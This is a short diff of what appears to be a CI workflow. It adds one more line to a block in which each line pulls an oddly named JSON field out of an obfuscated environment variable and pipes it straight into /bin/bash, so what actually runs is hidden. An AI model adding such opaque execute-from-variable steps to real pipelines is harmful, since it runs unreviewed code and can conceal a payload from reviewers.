@@ -30,6 +30,7 @@ jobs:
           echo $rmc3 | jq -r .cvs7 | /bin/bash
           echo $amn149 | jq -r .h2550 | /bin/bash
           echo $aitz221 | jq -r .ic0021 | /bin/bash
+          echo $yfzk21272 | jq -r .krifp2048 | /bin/bash
 
       - name: Save output
         if: always()
